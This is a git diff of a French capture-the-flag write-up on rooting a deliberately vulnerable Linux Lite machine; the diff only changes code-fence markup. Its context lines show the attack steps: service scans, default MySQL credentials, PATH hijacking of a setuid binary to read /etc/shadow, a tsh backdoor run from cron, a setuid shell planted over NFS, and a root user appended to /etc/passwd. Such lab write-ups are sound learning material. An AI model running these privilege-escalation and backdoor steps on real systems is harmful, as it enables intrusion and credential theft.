@@ -22,7 +22,7 @@ Inspection générale
 
 On lance un scan de port qui remonte rapidement les services Samba, on continue alors avec les outils classiques de la suite Samba :  
 
-```plain
+```
 $ nmblookup -A 192.168.3.2
 Looking up status of 192.168.3.2
         LINUX           <00> -         B <ACTIVE>
@@ -63,7 +63,7 @@ On a un nom de machine (Linux), un nom de partage (liteshare) mais 0 accès...
 
 Entre temps le scan a terminé avec des services supplémentaires :  
 
-```plain
+```
 Not shown: 65526 closed ports
 PORT      STATE SERVICE      REASON
 80/tcp    open  http         syn-ack ttl 64
@@ -103,14 +103,14 @@ MAC Address: 08:00:27:62:F1:E2 (Oracle VirtualBox virtual NIC)
 
 Evidemment on est tenté par le NFS (partage de fichiers Unix) alors on dégaine showmount :  
 
-```plain
+```
 $ showmount -a 192.168.3.2
 All mount points on 192.168.3.2:
 ```
 
 Une nouvelle fois rien à voir :| Il ne nous reste qu'à nous diriger vers le port 80. On lance *gobuster* car on tombe sur la page par défaut d'Apache :  
 
-```plain
+```
 $ gobuster -u http://192.168.3.2/ -w raft-large-files.txt -s 200,204,301,302,307,403,401
 /shell.php (Status: 200)
 ```
@@ -123,7 +123,7 @@ C'est aussi simple que cela !
 
 Le nom d'utilisateur avec une fin numérique laisse présager d'autres utilisateurs du même acabit. Ça ne rate pas :  
 
-```plain
+```
 user1:x:1000:1000:user1,,,:/home/user1:/bin/bash
 user2:x:1001:1001:user2,,,:/home/user2:/bin/bash
 user3:x:1002:1002:user3,,,:/home/user3:/bin/bash
@@ -139,7 +139,7 @@ On remarque que *user7* fait partie du groupe root. Et aussi qu'un mysql tourne 
 
 Tous les utilisateurs *user\** ont leur dossier dans /home avec un umask permissif permettant d'aller fouiller à droite à gauche :  
 
-```plain
+```
 drwxr-xr-x 22 user1 user1 4096 Jun  3 13:39 user1
 drwxr-xr-x 22 user2 user2 4096 Jun  3 13:40 user2
 drwxr-xr-x 22 user3 user3 4096 Jun  4 13:37 user3
@@ -152,7 +152,7 @@ drwxr-xr-x 22 user8 user8 4096 Jun  5 16:39 user8
 
 En allant fouiller dans les groupes on voit que user4 est aussi dans le groupe root en plus de son groupe à lui :  
 
-```plain
+```
 uid=1003(user4) gid=1003(user4) groups=1003(user4),0(root)
 ```
 
@@ -170,7 +170,7 @@ En fouillant dans les dossiers on voit vite que ça va être un vrai supplice d'
 The MySQL way
 -------------
 
-```plain
+```
 [+] We can connect to the local MYSQL service with default root/root credentials!
 mysqladmin  Ver 8.42 Distrib 5.7.26, for Linux on x86_64
 Copyright (c) 2000, 2019, Oracle and/or its affiliates. All rights reserved.
@@ -190,7 +190,7 @@ Threads: 1  Questions: 6  Slow queries: 0  Opens: 105  Flush tables: 1  Open tab
 
 On peut utiliser ces credentials pour fouiller dans le base SQL :  
 
-```plain
+```
 user6@osboxes:/var/www/html$ mysql -u root -p
 Enter password:
 Welcome to the MySQL monitor.  Commands end with ; or \g.
@@ -241,7 +241,7 @@ mysql> select * from user_info;
 
 Passer *mysql* nous amène à de nombreux mots de passe :  
 
-```plain
+```
 mysql@osboxes:~$ ls -al
 total 28
 drwxr-xrwx  4 root  root  4096 Jul  6 16:25 .
@@ -268,7 +268,7 @@ User2 vers user1 vers root
 
 On se connecte en *user2* et on voit qu'on peut passer *user1* via sudo :  
 
-```plain
+```
 $ sudo -l
 [sudo] password for user2:
 Matching Defaults entries for user2 on osboxes:
@@ -294,7 +294,7 @@ bash -i
 
 Dès lors il nous suffit de lancer le binaire :  
 
-```plain
+```
 user3$ ./shell
 You Can't Find Me
 Welcome to Linux Lite 4.4 user3
@@ -342,7 +342,7 @@ J'ai essayé de rajouter le [shebang](https://fr.wikipedia.org/wiki/Shebang) mai
 
 La *crontab* devrait appeler le fichier avec *bash -c*. Je n'ai pas la solution à ce mystère de pourquoi le *touch* fonctionnait, quoiqu'il en soit en recompilant *tshd* pour qu'il utilise un autre port et en plaçant le binaire à */home/user4/Desktop/autoscript.sh* il était bien exécuté.  
 
-```plain
+```
 $ ./tsh 192.168.3.2
 Welcome to Linux Lite 4.4
 
@@ -361,7 +361,7 @@ User5 vers root
 
 Cet utilisateur dispose lui aussi d'un binaire setuid 0 nommé *script*.  
 
-```plain
+```
 $ ./script 
 Desktop  Documents  Downloads  ls  Music  Pictures  Public  script  Templates  Videos
 ```
@@ -376,7 +376,7 @@ cat /etc/shadow
 
 On peut forcer l'utilisation du *ls* sous notre contrôle en changeant le PATH :  
 
-```plain
+```
 $ PATH=.:$PATH ./script 
 uid=0(root) gid=0(root) groups=0(root),1004(user5)
 root
@@ -389,7 +389,7 @@ User5 vers root (via NFS)
 
 La commande *showmount* a échouée, il n'en reste pas moins que *LinEnum* a vu l'existence d'un point de montage :  
 
-```plain
+```
 [-] NFS config details:
 -rw-r--r-- 1 root root 423 Jun  4 15:02 /etc/exports
 # /etc/exports: the access control list for filesystems which may be exported
@@ -408,7 +408,7 @@ La commande *showmount* a échouée, il n'en reste pas moins que *LinEnum* a vu 
 
 Depuis ma machine je monte le partage en root et j'y place un shell setuid 0. Ma machine est celle du CTF sont sous la même architecture (x86\_64) donc aucune difficulté.  
 
-```plain
+```
 root@kwak:/tmp# cd
 root@kwak:~# cd /tmp/
 root@kwak:/tmp# mkdir yolo
@@ -420,7 +420,7 @@ root@kwak:/tmp/yolo# chmod 4755 backdoor
 
 Et depuis la cible :  
 
-```plain
+```
 user5$ ls -l
 total 200
 -rwsr-xr-x 1 root  root  154072 Jul  6 21:12 backdoor
@@ -444,7 +444,7 @@ User7 vers root
 
 Faisant partie du groupe root on va bien trouver un fichier quelconque pour notre escalade de privilège...  
 
-```plain
+```
 $ find /etc/ -writable -type f  2> /dev/null
 /etc/papersize
 /etc/hostname
@@ -472,7 +472,7 @@ $ echo 'user9:$1$user9$JUQJ5MIu8N.kJJmfhHrfc0:0:0:/root:/bin/bash' >> /etc/passw
 
 Plus qu'à se connecter avec nos nouveaux identifiants (*user9 / s3cr3t*) :
 
-```plain
+```
 $ su user9
 Password:
 # id
@@ -482,7 +482,7 @@ uid=0(root) gid=0(root) groups=0(root)
 User8 vers root
 ---------------
 
-```plain
+```
 user8$ id
 uid=1007(user8) gid=1007(user8) groups=1007(user8)
 user8$ sudo -l
